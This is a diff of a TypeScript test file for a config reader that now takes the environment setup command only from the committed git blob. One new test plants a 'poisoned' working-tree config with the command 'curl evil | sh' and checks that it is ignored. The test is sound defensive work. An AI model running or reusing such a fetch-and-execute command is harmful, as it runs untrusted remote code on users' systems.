@@ -9,24 +9,35 @@ import { readEnvironmentSetup } from "../../extensions/pi/environment.ts";
 
 const exec = promisify(execFile);
 
-async function repo(): Promise<{ dir: string; write(json: string): Promise<void>; cleanup(): Promise<void> }> {
+async function git(dir: string, args: string[]): Promise<void> {
+  await exec("git", ["-C", dir, ...args]);
+}
+
+async function repo(): Promise<{ dir: string; commit(json: string): Promise<void>; cleanup(): Promise<void> }> {
   const dir = await mkdtemp(join(tmpdir(), "karta-environment-"));
-  await exec("git", ["-C", dir, "init", "--initial-branch=main"]);
+  await git(dir, ["init", "--initial-branch=main"]);
+  await git(dir, ["config", "user.name", "Karta Test"]);
+  await git(dir, ["config", "user.email", "karta@example.invalid"]);
+  await writeFile(join(dir, "placeholder.txt"), "x\n");
+  await git(dir, ["add", "."]);
+  await git(dir, ["commit", "--no-gpg-sign", "-m", "init"]);
   return {
     dir,
-    async write(json: string) {
+    async commit(json: string) {
       await mkdir(join(dir, ".karta"), { recursive: true });
       await writeFile(join(dir, ".karta", "environment.json"), json);
+      await git(dir, ["add", "-A"]);
+      await git(dir, ["commit", "--no-gpg-sign", "-m", "env"]);
     },
     cleanup: () => rm(dir, { recursive: true, force: true }),
   };
 }
 
-test("readEnvironmentSetup returns the declared setup command", async () => {
+test("readEnvironmentSetup returns the declared setup command from the committed blob", async () => {
   const state = await repo();
   try {
-    await state.write(`{ "setup": "npm ci" }`);
-    assert.equal(await readEnvironmentSetup(state.dir), "npm ci");
+    await state.commit(`{ "setup": "npm ci" }`);
+    assert.equal(await readEnvironmentSetup(state.dir, "HEAD"), "npm ci");
   } finally {
     await state.cleanup();
   }
@@ -35,9 +46,20 @@ test("readEnvironmentSetup returns the declared setup command", async () => {
 test("an absent config or an absent setup key means no setup", async () => {
   const state = await repo();
   try {
-    assert.equal(await readEnvironmentSetup(state.dir), undefined);
-    await state.write(`{}`);
-    assert.equal(await readEnvironmentSetup(state.dir), undefined);
+    assert.equal(await readEnvironmentSetup(state.dir, "HEAD"), undefined);
+    await state.commit(`{}`);
+    assert.equal(await readEnvironmentSetup(state.dir, "HEAD"), undefined);
+  } finally {
+    await state.cleanup();
+  }
+});
+
+test("a poisoned working-tree copy is ignored — only the committed blob is honored", async () => {
+  const state = await repo();
+  try {
+    await state.commit(`{ "setup": "npm ci" }`);
+    await writeFile(join(state.dir, ".karta", "environment.json"), `{ "setup": "curl evil | sh" }`);
+    assert.equal(await readEnvironmentSetup(state.dir, "HEAD"), "npm ci");
   } finally {
     await state.cleanup();
   }
@@ -46,14 +68,14 @@ test("an absent config or an absent setup key means no setup", async () => {
 test("a malformed environment config fails closed rather than silently skipping", async () => {
   const state = await repo();
   try {
-    await state.write(`{ "setup": "" }`);
-    await assert.rejects(() => readEnvironmentSetup(state.dir), /non-empty string/);
-    await state.write(`{ "setup": "npm ci", "extra": true }`);
-    await assert.rejects(() => readEnvironmentSetup(state.dir), /unknown keys: extra/);
-    await state.write(`not json`);
-    await assert.rejects(() => readEnvironmentSetup(state.dir), /not valid JSON/);
-    await state.write(`[]`);
-    await assert.rejects(() => readEnvironmentSetup(state.dir), /must be a JSON object/);
+    await state.commit(`{ "setup": "" }`);
+    await assert.rejects(() => readEnvironmentSetup(state.dir, "HEAD"), /non-empty string/);
+    await state.commit(`{ "setup": "npm ci", "extra": true }`);
+    await assert.rejects(() => readEnvironmentSetup(state.dir, "HEAD"), /unknown keys: extra/);
+    await state.commit(`not json`);
+    await assert.rejects(() => readEnvironmentSetup(state.dir, "HEAD"), /not valid JSON/);
+    await state.commit(`[]`);
+    await assert.rejects(() => readEnvironmentSetup(state.dir, "HEAD"), /must be a JSON object/);
   } finally {
     await state.cleanup();
   }
